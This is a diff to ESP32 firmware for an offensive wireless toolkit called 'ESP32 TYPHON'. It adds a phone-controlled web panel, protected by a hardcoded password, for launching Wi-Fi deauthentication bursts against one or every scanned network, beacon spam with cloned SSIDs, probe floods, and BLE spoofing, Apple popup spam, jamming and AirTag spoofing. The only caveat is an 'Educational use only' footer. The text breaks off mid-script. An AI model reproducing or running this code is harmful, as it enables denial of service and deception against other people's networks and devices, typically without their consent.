@@ -17,10 +17,14 @@
 #include "esp_wifi_types.h"
 #include "esp_timer.h"
 
-// Required so ESP32 accepts raw 802.11 TX frames
+// Required so ESP32 accepts raw 802.11 TX frames (linker --wrap)
 extern "C" int __wrap_ieee80211_raw_frame_sanity_check(int32_t a, int32_t b, int32_t c) {
   return 0;
 }
+
+// Soft-AP web mode state (declared early – used by WiFi tools)
+static bool webMode = false;
+static void restoreWebAP();  // defined with web handlers
 
 // ============================================================
 //  WiFi Scanner
@@ -33,6 +37,7 @@ struct WifiNet {
   int32_t rssi;
   uint8_t ch;
   bool    hidden;
+  uint8_t enc;
 };
 
 static WifiNet  wifiNets[WIFI_MAX_NETS];
@@ -40,8 +45,14 @@ static int      wifiCount = 0;
 static bool     wifiScanning = false;
 
 static void wifiScanBegin() {
-  WiFi.mode(WIFI_STA);
-  WiFi.disconnect(true, true);
+  if (webMode) {
+    // Keep Soft-AP up so the phone stays connected
+    WiFi.mode(WIFI_AP_STA);
+    WiFi.disconnect(false, false);  // don't kill AP
+  } else {
+    WiFi.mode(WIFI_STA);
+    WiFi.disconnect(true, true);
+  }
   delay(40);
   wifiCount = 0;
   wifiScanning = false;
@@ -49,9 +60,13 @@ static void wifiScanBegin() {
 
 static void wifiScanStart() {
   if (wifiScanning) return;
-  wifiCount = 0;
+  // Keep previous results visible until the new scan finishes
   wifiScanning = true;
-  WiFi.scanNetworks(true, true);
+  WiFi.scanDelete();
+  int r = WiFi.scanNetworks(true, true);
+  if (r == WIFI_SCAN_FAILED) {
+    wifiScanning = false;
+  }
 }
 
 static void wifiScanUpdate() {
@@ -71,6 +86,7 @@ static void wifiScanUpdate() {
     }
     wifiNets[i].rssi = WiFi.RSSI(i);
     wifiNets[i].ch   = WiFi.channel(i);
+    wifiNets[i].enc  = (uint8_t)WiFi.encryptionType(i);
     wifiNets[i].hidden = (wifiNets[i].ssid.length() == 0);
     if (wifiNets[i].hidden) wifiNets[i].ssid = "<hidden>";
   }
@@ -80,6 +96,7 @@ static void wifiScanUpdate() {
         WifiNet t = wifiNets[i]; wifiNets[i] = wifiNets[j]; wifiNets[j] = t;
       }
   WiFi.scanDelete();
+  if (webMode) restoreWebAP();
 }
 
 // ============================================================
@@ -103,11 +120,17 @@ static void IRAM_ATTR pmSniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
 static void pmStart() {
   memset((void*)pktCount, 0, sizeof(pktCount));
   pktTotal = 0;
-  pmChannel = 1;
+  // keep channel if already set from web (1-13)
+  if (pmChannel < 1 || pmChannel > 13) pmChannel = 1;
   pmRunning = true;
   pmLastHop = millis();
-  WiFi.mode(WIFI_STA);
-  WiFi.disconnect(true, true);
+  if (webMode) {
+    WiFi.mode(WIFI_AP_STA);
+    WiFi.disconnect(false, false);
+  } else {
+    WiFi.mode(WIFI_STA);
+    WiFi.disconnect(true, true);
+  }
   delay(50);
   esp_wifi_start();
   esp_wifi_set_promiscuous(true);
@@ -120,15 +143,21 @@ static void pmStop() {
   pmRunning = false;
   esp_wifi_set_promiscuous(false);
   esp_wifi_set_promiscuous_rx_cb(NULL);
+  if (webMode) restoreWebAP();
 }
 
 static void pmUpdate() {
   if (!pmRunning) return;
   if (millis() - pmLastHop >= 180) {
     pmLastHop = millis();
-    pmChannel++;
-    if (pmChannel > 14) pmChannel = 1;
-    esp_wifi_set_channel(pmChannel, WIFI_SECOND_CHAN_NONE);
+    if (webMode) {
+      // Stay on selected channel so Soft-AP remains reachable
+      esp_wifi_set_channel(pmChannel, WIFI_SECOND_CHAN_NONE);
+    } else {
+      pmChannel++;
+      if (pmChannel > 14) pmChannel = 1;
+      esp_wifi_set_channel(pmChannel, WIFI_SECOND_CHAN_NONE);
+    }
   }
 }
 
@@ -141,8 +170,13 @@ static uint32_t beaconLast = 0;
 static uint8_t beaconCh = 1;
 static uint8_t beaconMac[6];
 static uint32_t beaconSent = 0;
-static uint8_t  beaconMode = 0;  // 0 = funny list, 1 = clone scanned SSIDs
+static uint8_t  beaconMode = 0;  // 0 = funny list, 1 = clone scanned, 2 = custom web list
 static int      beaconCloneIdx = 0;
+
+// Web-only custom beacon SSIDs (mode 2)
+static char customBeaconSSIDs[10][33];
+static int  customBeaconCount = 0;
+static int  customBeaconIdx = 0;
 
 static const char* beaconSSIDs[] = {
   "Free_WiFi", "Starbucks", "Airport_WiFi", "Hotel_Guest",
@@ -215,21 +249,32 @@ static void beaconStart() {
   beaconRunning = true;
   beaconIdx = 0;
   beaconCloneIdx = 0;
+  customBeaconIdx = 0;
   beaconLast = 0;
   beaconCh = 1;
   beaconSent = 0;
   beaconRandomMac();
-  WiFi.mode(WIFI_AP);
-  // minimal AP so WIFI_IF_AP exists for TX
-  WiFi.softAP("esp32div", nullptr, beaconCh, 1 /* hidden */, 0);
+  if (webMode) {
+    // Keep ESP32-1 AP; only change channel for TX
+    WiFi.mode(WIFI_AP);
+    WiFi.softAP("ESP32-1", "rgisking", beaconCh, 0, 4);
+  } else {
+    WiFi.mode(WIFI_AP);
+    // minimal AP so WIFI_IF_AP exists for TX
+    WiFi.softAP("esp32div", nullptr, beaconCh, 1 /* hidden */, 0);
+  }
   delay(40);
   esp_wifi_set_channel(beaconCh, WIFI_SECOND_CHAN_NONE);
 }
 
 static void beaconStop() {
   beaconRunning = false;
-  WiFi.softAPdisconnect(true);
-  WiFi.mode(WIFI_STA);
+  if (webMode) {
+    restoreWebAP();
+  } else {
+    WiFi.softAPdisconnect(true);
+    WiFi.mode(WIFI_STA);
+  }
 }
 
 static void beaconUpdate() {
@@ -238,12 +283,20 @@ static void beaconUpdate() {
   beaconLast = millis();
 
   const char* ssid;
-  if (beaconMode == 1 && wifiCount > 0) {
+  if (beaconMode == 2 && customBeaconCount > 0) {
+    ssid = customBeaconSSIDs[customBeaconIdx % customBeaconCount];
+    if (webMode) beaconCh = 1;
+  } else if (beaconMode == 1 && wifiCount > 0) {
     ssid = wifiNets[beaconCloneIdx].ssid.c_str();
-    beaconCh = wifiNets[beaconCloneIdx].ch;
-    if (beaconCh < 1 || beaconCh > 13) beaconCh = 1;
+    // In web mode keep Soft-AP channel (1) so the browser stays connected
+    if (webMode) beaconCh = 1;
+    else {
+      beaconCh = wifiNets[beaconCloneIdx].ch;
+      if (beaconCh < 1 || beaconCh > 13) beaconCh = 1;
+    }
   } else {
     ssid = beaconSSIDs[beaconIdx];
+    if (webMode) beaconCh = 1;  // lock channel while web UI is active
   }
 
   bool wpa2 = (esp_random() % 10) < 4;
@@ -256,15 +309,20 @@ static void beaconUpdate() {
     beaconSent += 2;
   }
 
-  if (beaconMode == 1 && wifiCount > 0) {
+  if (beaconMode == 2 && customBeaconCount > 0) {
+    customBeaconIdx = (customBeaconIdx + 1) % customBeaconCount;
+    if (customBeaconIdx == 0) beaconRandomMac();
+  } else if (beaconMode == 1 && wifiCount > 0) {
     beaconCloneIdx = (beaconCloneIdx + 1) % wifiCount;
     if (beaconCloneIdx == 0) beaconRandomMac();
   } else {
     beaconIdx = (beaconIdx + 1) % BEACON_SSID_COUNT;
     if (beaconIdx == 0) {
-      if (beaconCh == 1) beaconCh = 6;
-      else if (beaconCh == 6) beaconCh = 11;
-      else beaconCh = 1;
+      if (!webMode) {
+        if (beaconCh == 1) beaconCh = 6;
+        else if (beaconCh == 6) beaconCh = 11;
+        else beaconCh = 1;
+      }
       beaconRandomMac();
     }
   }
@@ -307,8 +365,13 @@ static void detStart() {
   detCh = 1;
   detMainOnly = true;
   detRunning = true;
-  WiFi.mode(WIFI_STA);
-  WiFi.disconnect(true, true);
+  if (webMode) {
+    WiFi.mode(WIFI_AP_STA);
+    WiFi.disconnect(false, false);
+  } else {
+    WiFi.mode(WIFI_STA);
+    WiFi.disconnect(true, true);
+  }
   delay(40);
   esp_wifi_start();
   esp_wifi_set_promiscuous(true);
@@ -321,6 +384,7 @@ static void detStop() {
   detRunning = false;
   esp_wifi_set_promiscuous(false);
   esp_wifi_set_promiscuous_rx_cb(NULL);
+  if (webMode) restoreWebAP();
 }
 
 static void detUpdate() {
@@ -386,17 +450,28 @@ static void deauthStart(int targetIdx) {
   deauthBuild(wifiNets[targetIdx].bssid, false);
   deauthBuildRev(wifiNets[targetIdx].bssid);
 
-  WiFi.mode(WIFI_AP);
-  WiFi.softAP("esp32div", nullptr, wifiNets[targetIdx].ch, 1, 0);
+  uint8_t ch = wifiNets[targetIdx].ch;
+  if (ch < 1 || ch > 13) ch = 1;
+  if (webMode) {
+    WiFi.mode(WIFI_AP);
+    WiFi.softAP("ESP32-1", "rgisking", ch, 0, 4);
+  } else {
+    WiFi.mode(WIFI_AP);
+    WiFi.softAP("esp32div", nullptr, ch, 1, 0);
+  }
   delay(40);
-  esp_wifi_set_channel(wifiNets[targetIdx].ch, WIFI_SECOND_CHAN_NONE);
+  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
 }
 
 static void deauthStop() {
   deauthRunning = false;
   deauthTarget = -1;
-  WiFi.softAPdisconnect(true);
-  WiFi.mode(WIFI_STA);
+  if (webMode) {
+    restoreWebAP();
+  } else {
+    WiFi.softAPdisconnect(true);
+    WiFi.mode(WIFI_STA);
+  }
 }
 
 static void deauthUpdate() {
@@ -411,7 +486,8 @@ static void deauthUpdate() {
     int ti = roundIdx++;
     deauthBuild(wifiNets[ti].bssid, false);
     deauthBuildRev(wifiNets[ti].bssid);
-    esp_wifi_set_channel(wifiNets[ti].ch, WIFI_SECOND_CHAN_NONE);
+    // Keep Soft-AP on CH1 in web mode so browser stays connected
+    esp_wifi_set_channel(webMode ? 1 : wifiNets[ti].ch, WIFI_SECOND_CHAN_NONE);
     for (int i = 0; i < 5; i++) {
       esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
       deauthSent++;
@@ -433,7 +509,7 @@ static void deauthUpdate() {
   }
   if (millis() - deauthLast < 12) return;
   deauthLast = millis();
-  esp_wifi_set_channel(wifiNets[deauthTarget].ch, WIFI_SECOND_CHAN_NONE);
+  esp_wifi_set_channel(webMode ? 1 : wifiNets[deauthTarget].ch, WIFI_SECOND_CHAN_NONE);
   // Deauth + disassoc + reverse direction bursts
   deauthBuild(wifiNets[deauthTarget].bssid, false);
   for (int i = 0; i < 6; i++) {
@@ -457,8 +533,13 @@ static void deauthStartAll() {
   deauthRunning = true;
   deauthSent = 0;
   deauthLast = 0;
-  WiFi.mode(WIFI_AP);
-  WiFi.softAP("esp32div", nullptr, 1, 1, 0);
+  if (webMode) {
+    WiFi.mode(WIFI_AP);
+    WiFi.softAP("ESP32-1", "rgisking", 1, 0, 4);
+  } else {
+    WiFi.mode(WIFI_AP);
+    WiFi.softAP("esp32div", nullptr, 1, 1, 0);
+  }
   delay(40);
 }
 
@@ -510,16 +591,25 @@ static void probeStart() {
   probeCh = 1;
   probeRandomMac();
   probeBuild();
-  WiFi.mode(WIFI_AP);
-  WiFi.softAP("esp32div", nullptr, probeCh, 1, 0);
+  if (webMode) {
+    WiFi.mode(WIFI_AP);
+    WiFi.softAP("ESP32-1", "rgisking", probeCh, 0, 4);
+  } else {
+    WiFi.mode(WIFI_AP);
+    WiFi.softAP("esp32div", nullptr, probeCh, 1, 0);
+  }
   delay(40);
   esp_wifi_set_channel(probeCh, WIFI_SECOND_CHAN_NONE);
 }
 
 static void probeStop() {
   probeRunning = false;
-  WiFi.softAPdisconnect(true);
-  WiFi.mode(WIFI_STA);
+  if (webMode) {
+    restoreWebAP();
+  } else {
+    WiFi.softAPdisconnect(true);
+    WiFi.mode(WIFI_STA);
+  }
 }
 
 static void probeUpdate() {
@@ -540,8 +630,12 @@ static void probeUpdate() {
     probeSent++;
   }
   if (probeSent % 25 == 0) {
-    probeCh++;
-    if (probeCh > 13) probeCh = 1;
+    if (!webMode) {
+      probeCh++;
+      if (probeCh > 13) probeCh = 1;
+    } else {
+      probeCh = 1;  // keep Soft-AP channel
+    }
     probeRandomMac();
   }
 }
@@ -625,6 +719,53 @@ static void captiveUpdate() {
   webServer.handleClient();
   captiveClients = WiFi.softAPgetStationNum();
 }
+
+// ============================================================
+//  Soft-AP Web UI mode  (BOOT held 2 s)
+//  SSID: ESP32-1   Password: rgisking
+//  Full handlers live after BLE tools (see below).
+// ============================================================
+static uint32_t bootHoldStart = 0;
+static bool     bootWasDown = false;
+static bool     webExitRequested = false;
+
+// Forward decls for tools defined later
+static void sniffStop();
+static void spoofStop();
+static void sourStop();
+static void jamStop();
+static void airTagStop();
+
+static void restoreWebAP() {
+  if (!webMode) return;
+  // Keep Soft-AP alive for the browser session
+  WiFi.mode(WIFI_AP);
+  WiFi.softAP("ESP32-1", "rgisking");
+  delay(80);
+}
+
+static void stopAllTools() {
+  pmStop();
+  beaconStop();
+  detStop();
+  deauthStop();
+  probeStop();
+  captiveStop();
+  sniffStop();
+  spoofStop();
+  sourStop();
+  jamStop();
+  airTagStop();
+  wifiScanning = false;
+  restoreWebAP();
+}
+
+// Placeholder – real implementations after BLE section
+static void drawWebModeScreen();
+static void enterWebMode();
+static void exitWebMode();
+static void setupWebRoutes();
+static void handleWebClients();
 
 // ============================================================
 //  BLE Scanner
@@ -720,7 +861,8 @@ static void sniffUpdate() {
 static bool spoofRunning = false;
 static uint8_t spoofIdx = 0;
 static uint32_t spoofLast = 0;
-static uint8_t spoofMode = 0;  // 0 = name list, 1 = clone scanned BLE names
+static uint8_t spoofMode = 0;  // 0 = name list, 1 = clone scanned, 2 = custom
+static String  spoofCustomName = "ESP32-TYPHON";
 static const char* spoofNames[] = {
   "AirPods Pro", "Galaxy Buds", "Pixel Buds", "Sony WH-1000",
   "JBL Flip", "Bose QC", "Beats Fit", "Unknown Device"
@@ -751,7 +893,9 @@ static void spoofUpdate() {
   spoofLast = millis();
 
   const char* name;
-  if (spoofMode == 1 && bleCount > 0) {
+  if (spoofMode == 2) {
+    name = spoofCustomName.c_str();
+  } else if (spoofMode == 1 && bleCount > 0) {
     name = bleDevs[spoofIdx % bleCount].name.c_str();
     spoofIdx = (spoofIdx + 1) % bleCount;
   } else {
@@ -1003,6 +1147,647 @@ static void airTagUpdate() {
   adv->start();
 }
 
+
+// ============================================================
+//  Soft-AP Web UI – full handlers (after all tools are defined)
+// ============================================================
+static const char WEB_PAGE[] PROGMEM = R"HTML(
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>ESP32 TYPHON</title>
+<style>
+:root{--bg:#000000;--card:#0a0f0a;--line:#1a2e1a;--acc:#00ff66;--ok:#00ff66;--warn:#ffb020;--err:#ff3333;--fg:#ffffff;--dim:#7a9a7a;--r:14px}
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;background:var(--bg);color:var(--fg);min-height:100vh}
+.top{position:sticky;top:0;z-index:20;background:rgba(7,11,16,.94);backdrop-filter:blur(10px);border-bottom:1px solid var(--line);padding:12px 14px}
+.brand{display:flex;align-items:center;justify-content:space-between;gap:10px}
+.brand h1{font-size:1.05rem;color:var(--acc)}
+.mode{font-size:.78rem;font-weight:700;letter-spacing:.04em;text-transform:uppercase;padding:6px 12px;border-radius:999px;border:1px solid var(--line)}
+.mode.idle{background:#0a0a0a;color:var(--dim)}
+.mode.scanning{background:#001a0a;color:var(--acc);border-color:#00aa44}
+.mode.attacking{background:#1a0505;color:var(--err);border-color:#aa2222}
+.mode.defending{background:#001a0a;color:var(--ok);border-color:#00aa44}
+.stats{margin-top:8px;font-size:.78rem;color:var(--dim)}
+.stats b{color:var(--fg)}
+.wrap{max-width:720px;margin:0 auto;padding:14px}
+.view{display:none}.view.active{display:block}
+.grid{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+@media(max-width:420px){.grid{grid-template-columns:1fr}}
+.tile{background:linear-gradient(160deg,var(--card),#050805);border:1px solid var(--line);border-radius:var(--r);padding:18px 14px;cursor:pointer}
+.tile:active{transform:scale(.98)}
+.tile .ico{font-size:1.35rem;margin-bottom:8px}
+.tile h2{font-size:.95rem;margin-bottom:4px}
+.tile p{font-size:.75rem;color:var(--dim);line-height:1.35}
+.card{background:var(--card);border:1px solid var(--line);border-radius:var(--r);padding:14px;margin-bottom:12px}
+.card h3{font-size:.9rem;margin-bottom:10px;display:flex;align-items:center;justify-content:space-between;gap:8px}
+.row{display:flex;flex-wrap:wrap;gap:8px;margin-top:10px;align-items:center}
+button{appearance:none;border:0;border-radius:10px;padding:12px 16px;font-size:.9rem;font-weight:600;cursor:pointer;background:var(--acc);color:#000}
+button.sec{background:#111;color:var(--fg);border:1px solid var(--line)}
+button.danger{background:var(--err);color:#fff}
+button.on{background:var(--err);color:#fff}
+button.attack{background:var(--err);color:#fff}
+button:disabled{opacity:.45}
+select,input{background:#050805;border:1px solid var(--line);color:var(--fg);border-radius:10px;padding:10px 12px;font-size:.88rem;width:100%}
+#customSsidBox{display:none;margin-top:8px}
+#customSsidBox.show{display:block}
+.ssidRow{margin-bottom:6px}
+label.lbl{font-size:.75rem;color:var(--dim);display:block;margin:8px 0 4px}
+.list{margin-top:8px;max-height:320px;overflow:auto;border:1px solid var(--line);border-radius:10px}
+.item{display:flex;justify-content:space-between;gap:8px;padding:10px 12px;border-bottom:1px solid var(--line);font-size:.82rem;align-items:flex-start}
+.item:last-child{border-bottom:0}
+.item .meta{color:var(--dim);font-size:.72rem;margin-top:2px}
+.item.active{background:#15324a}
+.dot{display:inline-block;width:8px;height:8px;border-radius:50%;background:var(--ok);margin-right:6px;vertical-align:middle}
+.rssi-g{color:#2ee59d}.rssi-y{color:#ffd84d}.rssi-o{color:#ffb020}.rssi-r{color:#ff5a6a}
+.enc{font-size:.7rem;padding:2px 7px;border-radius:6px;background:#1a2736;color:var(--dim);margin-left:6px}
+.nav{display:flex;gap:8px;align-items:center;margin-bottom:12px}
+.back{background:transparent;color:var(--acc);border:1px solid var(--line);padding:8px 12px;font-size:.8rem}
+.msg{min-height:1.1em;font-size:.78rem;color:var(--dim);margin-top:8px}
+.footer{text-align:center;color:var(--dim);font-size:.72rem;padding:18px 8px 28px}
+.bar{height:5px;background:#1a2736;border-radius:99px;overflow:hidden;margin-top:8px}
+.bar>i{display:block;height:100%;width:0;background:var(--acc);transition:width .25s}
+.stopall{width:100%;margin-top:12px}
+</style>
+</head>
+<body>
+<div class="top">
+  <div class="brand">
+    <h1>ESP32 TYPHON</h1>
+    <span id="modePill" class="mode idle">Idle</span>
+  </div>
+  <div class="stats">Temp <b id="temp">—</b> °C</div>
+</div>
+<div class="wrap">
+
+<div id="v-home" class="view active">
+  <div class="grid">
+    <div class="tile" onclick="go('wifi')"><div class="ico">📡</div><h2>Wi‑Fi Tools</h2><p>Scan, monitor, beacon, deauth, probe</p></div>
+    <div class="tile" onclick="go('ble')"><div class="ico">🔵</div><h2>Bluetooth</h2><p>Scan, spoof, Sour Apple, jam, AirTag</p></div>
+  </div>
+  <button class="danger stopall" onclick="act('stop_all')">Stop all tools</button>
+  <div class="msg" id="sysMsg"></div>
+</div>
+
+<div id="v-wifi" class="view">
+  <div class="nav"><button class="back" onclick="go('home')">← Home</button><h2 style="font-size:1rem">Wi‑Fi Tools</h2></div>
+  <div class="grid">
+    <div class="tile" onclick="go('wifi-scan')"><div class="ico">🔍</div><h2>Scanner</h2><p>Nearby access points</p></div>
+    <div class="tile" onclick="go('wifi-pm')"><div class="ico">📊</div><h2>Packet Monitor</h2><p>Channel activity</p></div>
+    <div class="tile" onclick="go('wifi-beacon')"><div class="ico">📢</div><h2>Beacon Spam</h2><p>List or clone SSIDs</p></div>
+    <div class="tile" onclick="go('wifi-deauth')"><div class="ico">⚡</div><h2>Deauth</h2><p>Target from scan</p></div>
+    <div class="tile" onclick="go('wifi-det')"><div class="ico">🛡</div><h2>Deauth Detector</h2><p>Watch for attacks</p></div>
+    <div class="tile" onclick="go('wifi-probe')"><div class="ico">📨</div><h2>Probe Flood</h2><p>Probe requests</p></div>
+  </div>
+  <button class="danger stopall" onclick="act('stop_all')">Stop all tools</button>
+</div>
+
+<div id="v-ble" class="view">
+  <div class="nav"><button class="back" onclick="go('home')">← Home</button><h2 style="font-size:1rem">Bluetooth</h2></div>
+  <div class="grid">
+    <div class="tile" onclick="go('ble-scan')"><div class="ico">🔎</div><h2>BLE Scanner</h2><p>Nearby devices</p></div>
+    <div class="tile" onclick="go('ble-sniff')"><div class="ico">👁</div><h2>BLE Sniffer</h2><p>Continuous scan</p></div>
+    <div class="tile" onclick="go('ble-spoof')"><div class="ico">🎭</div><h2>BLE Spoofer</h2><p>Fake names</p></div>
+    <div class="tile" onclick="go('ble-sour')"><div class="ico">🍎</div><h2>Sour Apple</h2><p>Pick model / action</p></div>
+    <div class="tile" onclick="go('ble-jam')"><div class="ico">📻</div><h2>BLE Jammer</h2><p>Noise flood</p></div>
+    <div class="tile" onclick="go('ble-air')"><div class="ico">🏷</div><h2>AirTag Spoof</h2><p>Find My style ADV</p></div>
+  </div>
+  <button class="danger stopall" onclick="act('stop_all')">Stop all tools</button>
+</div>
+
+<div id="v-wifi-scan" class="view">
+  <div class="nav"><button class="back" onclick="go('wifi')">← Wi‑Fi</button><h2 style="font-size:1rem">Wi‑Fi Scanner</h2></div>
+  <div class="card">
+    <h3>Scanner</h3>
+    <div class="row"><button id="btnWifiScan" onclick="act('wifi_scan')">Start scan</button></div>
+    <div class="bar"><i id="wscanBar"></i></div>
+    <div class="msg" id="wscanMsg">Previous results stay until a new scan finishes</div>
+    <div class="list" id="wifiList"></div>
+  </div>
+</div>
+
+<div id="v-wifi-pm" class="view">
+  <div class="nav"><button class="back" onclick="go('wifi')">← Wi‑Fi</button><h2 style="font-size:1rem">Packet Monitor</h2></div>
+  <div class="card">
+    <h3>Monitor</h3>
+    <label class="lbl">Channel (1–13)</label>
+    <input type="number" id="pmCh" min="1" max="13" value="1">
+    <div class="row"><button id="btnPm" onclick="toggle('pm')">Start</button></div>
+    <div class="msg">Packets: <b id="pmTotal">0</b> · CH <b id="pmChLive">1</b></div>
+  </div>
+</div>
+
+<div id="v-wifi-beacon" class="view">
+  <div class="nav"><button class="back" onclick="go('wifi')">← Wi‑Fi</button><h2 style="font-size:1rem">Beacon Spammer</h2></div>
+  <div class="card">
+    <h3>Beacon</h3>
+    <label class="lbl">Mode</label>
+    <select id="beaconMode" onchange="onBeaconMode()">
+      <option value="0">Funny SSID list</option>
+      <option value="1">Clone scanned SSIDs</option>
+      <option value="2">Add list of SSIDs</option>
+    </select>
+    <div id="customSsidBox">
+      <label class="lbl">How many SSIDs (1–10)</label>
+      <select id="ssidCount" onchange="buildSsidInputs()">
+        <option>1</option><option>2</option><option>3</option><option>4</option><option>5</option>
+        <option>6</option><option>7</option><option>8</option><option>9</option><option>10</option>
+      </select>
+      <div id="ssidInputs" style="margin-top:8px"></div>
+    </div>
+    <div class="row"><button id="btnBeacon" class="attack" onclick="toggle('beacon')">Start</button></div>
+    <div class="msg">Sent: <b id="beaconSent">0</b></div>
+  </div>
+</div>
+
+<div id="v-wifi-deauth" class="view">
+  <div class="nav"><button class="back" onclick="go('wifi')">← Wi‑Fi</button><h2 style="font-size:1rem">Deauth Attack</h2></div>
+  <div class="card">
+    <h3>Target</h3>
+    <div class="msg">Scan Wi‑Fi first, then tap a network</div>
+    <div class="list" id="deauthList"></div>
+    <div class="row">
+      <button id="btnDeauth" class="attack" onclick="toggle('deauth')">Start</button>
+      <button class="sec" onclick="act('deauth_start',{target:-1})">Attack all</button>
+    </div>
+    <div class="msg">Sent: <b id="deauthSent">0</b></div>
+  </div>
+</div>
+
+<div id="v-wifi-det" class="view">
+  <div class="nav"><button class="back" onclick="go('wifi')">← Wi‑Fi</button><h2 style="font-size:1rem">Deauth Detector</h2></div>
+  <div class="card">
+    <h3>Detector</h3>
+    <div class="row"><button id="btnDet" onclick="toggle('det')">Start</button></div>
+    <div class="msg">Detected frames: <b id="detCount">0</b></div>
+  </div>
+</div>
+
+<div id="v-wifi-probe" class="view">
+  <div class="nav"><button class="back" onclick="go('wifi')">← Wi‑Fi</button><h2 style="font-size:1rem">Probe Flood</h2></div>
+  <div class="card">
+    <h3>Probe</h3>
+    <div class="row"><button id="btnProbe" class="attack" onclick="toggle('probe')">Start</button></div>
+    <div class="msg">Sent: <b id="probeSent">0</b></div>
+  </div>
+</div>
+
+<div id="v-ble-scan" class="view">
+  <div class="nav"><button class="back" onclick="go('ble')">← Bluetooth</button><h2 style="font-size:1rem">BLE Scanner</h2></div>
+  <div class="card">
+    <h3>Scan</h3>
+    <div class="row"><button id="btnBleScan" onclick="act('ble_scan')">Start scan</button></div>
+    <div class="bar"><i id="bscanBar"></i></div>
+    <div class="list" id="bleList"></div>
+  </div>
+</div>
+
+<div id="v-ble-sniff" class="view">
+  <div class="nav"><button class="back" onclick="go('ble')">← Bluetooth</button><h2 style="font-size:1rem">BLE Sniffer</h2></div>
+  <div class="card">
+    <h3>Sniffer</h3>
+    <div class="row"><button id="btnSniff" onclick="toggle('sniff')">Start</button></div>
+    <div class="list" id="bleList2"></div>
+  </div>
+</div>
+
+<div id="v-ble-spoof" class="view">
+  <div class="nav"><button class="back" onclick="go('ble')">← Bluetooth</button><h2 style="font-size:1rem">BLE Spoofer</h2></div>
+  <div class="card">
+    <h3>Advertise</h3>
+    <label class="lbl">Mode</label>
+    <select id="spoofMode">
+      <option value="0">Rotating name list</option>
+      <option value="1">Clone scanned BLE names</option>
+      <option value="2">Custom name</option>
+    </select>
+    <label class="lbl">Custom name</label>
+    <input id="spoofName" placeholder="My Device" maxlength="28">
+    <div class="row"><button id="btnSpoof" class="attack" onclick="toggle('spoof')">Start</button></div>
+  </div>
+</div>
+
+<div id="v-ble-sour" class="view">
+  <div class="nav"><button class="back" onclick="go('ble')">← Bluetooth</button><h2 style="font-size:1rem">Sour Apple</h2></div>
+  <div class="card">
+    <h3>Model / Action</h3>
+    <label class="lbl">Select what to advertise</label>
+    <select id="sourIdx"><option value="-1">Random Mix</option></select>
+    <div class="row"><button id="btnSour" class="attack" onclick="toggle('sour')">Start</button></div>
+    <div class="msg">Sent: <b id="sourSent">0</b> · Active: <b id="sourName">—</b></div>
+  </div>
+</div>
+
+<div id="v-ble-jam" class="view">
+  <div class="nav"><button class="back" onclick="go('ble')">← Bluetooth</button><h2 style="font-size:1rem">BLE Jammer</h2></div>
+  <div class="card">
+    <h3>Noise</h3>
+    <div class="row"><button id="btnJam" class="attack" onclick="toggle('jam')">Start</button></div>
+    <div class="msg">Noise packets: <b id="jamCount">0</b></div>
+  </div>
+</div>
+
+<div id="v-ble-air" class="view">
+  <div class="nav"><button class="back" onclick="go('ble')">← Bluetooth</button><h2 style="font-size:1rem">AirTag Spoof</h2></div>
+  <div class="card">
+    <h3>Find My ADV</h3>
+    <div class="row"><button id="btnAir" class="attack" onclick="toggle('air')">Start</button></div>
+    <div class="msg">Sent: <b id="airSent">0</b></div>
+  </div>
+</div>
+
+<div class="footer">Hold BOOT 2s to exit web mode · Educational use only</div>
+</div>
+<script>
+let deauthTarget=-1, appleReady=false, S={};
+function go(id){document.querySelectorAll('.view').forEach(v=>v.classList.remove('active'));const e=document.getElementById('v-'+id);if(e)e.classList.add('active');}
+function onBeaconMode(){
+  const m=document.getElementById('beaconMode').value;
+  document.getElementById('customSsidBox').classList.toggle('show', m==='2');
+  if(m==='2') buildSsidInputs();
+}
+function buildSsidInputs(){
+  const n=parseInt(document.getElementById('ssidCount').value)||1;
+  const box=document.getElementById('ssidInputs');
+  let h='';
+  for(let i=0;i<n;i++) h+=`<div class="ssidRow"><input id="ssid${i}" maxlength="32" placeholder="SSID ${i+1}"></div>`;
+  box.innerHTML=h;
+}
+function esc(s){return String(s||'').replace(/[<>&]/g,c=>({'<':'&lt;','>':'&gt;','&':'&amp;'}[c]));}
+function rssiClass(r){if(r>=-55)return'rssi-g';if(r>=-70)return'rssi-y';if(r>=-80)return'rssi-o';return'rssi-r';}
+function wifiItem(n,i,clickable){
+  const open=!!n.open;
+  const enc=esc(n.enc|| (open?'Open':'Secured'));
+  const dot=open?'<span class="dot" title="Open network"></span>':'';
+  const onclick=clickable?`onclick="pickDeauth(${i})"`:'';
+  const active=(clickable&&deauthTarget===i)?' active':'';
+  return `<div class="item${active}" ${onclick}>
+    <div>${dot}<b>${esc(n.ssid)}</b><span class="enc">${enc}</span>
+      <div class="meta">${esc(n.bssid||'')} · CH ${n.ch}</div></div>
+    <div class="${rssiClass(n.rssi)}">${n.rssi} dBm</div></div>`;
+}
+function renderWifi(list){
+  const empty='<div class="item"><span>No networks yet — run a scan</span></div>';
+  if(!list||!list.length){document.getElementById('wifiList').innerHTML=empty;document.getElementById('deauthList').innerHTML=empty;return;}
+  document.getElementById('wifiList').innerHTML=list.map((n,i)=>wifiItem(n,i,false)).join('');
+  document.getElementById('deauthList').innerHTML=list.map((n,i)=>wifiItem(n,i,true)).join('');
+}
+function renderBle(list){
+  const html=(!list||!list.length)?'<div class="item"><span>No devices yet — run a scan</span></div>':
+    list.map(n=>`<div class="item"><div><b>${esc(n.name)}</b><div class="meta">${esc(n.addr||'')}</div></div><div class="${rssiClass(n.rssi)}">${n.rssi} dBm</div></div>`).join('');
+  document.getElementById('bleList').innerHTML=html;
+  document.getElementById('bleList2').innerHTML=html;
+}
+function pickDeauth(i){deauthTarget=i;renderWifi(S.wifi||[]);}
+function fillApple(names){if(appleReady||!names)return;const sel=document.getElementById('sourIdx');names.forEach((n,i)=>{const o=document.createElement('option');o.value=i;o.textContent=n;sel.appendChild(o);});appleReady=true;}
+function setToggle(id,on){const b=document.getElementById(id);if(!b)return;b.textContent=on?'Stop':'Start';b.classList.toggle('on',!!on);}
+function setMode(m){
